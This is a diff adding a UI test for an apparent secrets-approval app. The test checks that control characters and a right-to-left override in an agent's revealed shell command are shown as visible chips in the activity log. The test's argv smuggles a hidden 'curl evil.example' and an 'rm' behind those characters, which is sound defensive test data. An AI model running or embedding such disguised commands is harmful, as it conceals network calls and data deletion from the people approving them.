@@ -578,3 +578,58 @@ test('an allowed reveal shows in Settings activity, also under Only reveals, and
   );
   assert.deepEqual(page.errors, []);
 });
+
+test('control characters in a revealed command and its cwd show as chips in the activity log', async (t) => {
+  const page = await open(t, { approvals: 'none', vault: 'secrets' });
+  await page.evaluate(() => {
+    const now = Date.now();
+    window.model.approvals.raise({
+      id: 'ask-crafted',
+      kind: 'secret',
+      mode: 'reveal',
+      name: 'HARBOR_API_KEY',
+      reveal: true,
+      requester: { kind: 'agent', name: 'docs-pass' },
+      process: {
+        exe: '/usr/bin/sh',
+        argv: ['sh', '-c', 'echo ok\r\u202ecurl evil.example\nrm'],
+        cwd: '/home/cone\rharbor',
+      },
+      createdAt: now,
+      expiresAt: now + 300_000,
+    });
+    return true;
+  });
+  await asked(page, 'ask-crafted');
+  await press(page, '[data-action=allow]');
+  await page.until(() => !window.approvals().querySelector('dialog'));
+  await page.evaluate(() => window.$('slicc-app', 'header swc-action-button#settings').click());
+  await page.until(() => !!window.settingsPart('slicc-secrets', '.audit li[data-type=reveal]'));
+  const chips = (selector) =>
+    [...window.settingsPart('slicc-secrets').shadowRoot.querySelectorAll(selector)].map(
+      (chip) => chip.title
+    );
+  const controls = [
+    'carriage return (U+000D)',
+    'U+202E',
+    'line feed (U+000A)',
+    'carriage return (U+000D)',
+  ];
+  assert.deepEqual(
+    await page.evaluate(chips, '.audit li[data-type=reveal] .what code .control'),
+    controls
+  );
+  assert.deepEqual(
+    await page.evaluate(chips, '[data-secret=HARBOR_API_KEY] [data-exec] code .control'),
+    controls.slice(0, 3)
+  );
+  assert.equal(
+    await page.evaluate(() =>
+      /[\r\n\u202e]/.test(
+        window.settingsPart('slicc-secrets', '.audit li[data-type=reveal] .what').textContent
+      )
+    ),
+    false
+  );
+  assert.deepEqual(page.errors, []);
+});
